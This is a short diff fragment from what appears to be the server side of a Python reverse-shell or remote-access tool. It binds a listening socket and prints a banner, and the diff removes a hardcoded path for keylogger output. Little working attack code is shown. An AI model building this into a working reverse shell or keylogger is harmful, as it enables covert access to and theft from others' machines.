@@ -17,7 +17,7 @@ SEPARATOR = "<sep>"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((str(args.LHOST), args.PORT))
 current_date=str(date.today())
-dir='/home/samanonym/keylog_output/log.txt'
+
  
 print("""████████╗██████╗ ██╗   ██╗████████╗██╗     ███████╗███████╗██╗  ██╗███████╗██╗     ██╗     
 ╚══██╔══╝██╔══██╗██║   ██║╚══██╔══╝██║     ██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║     
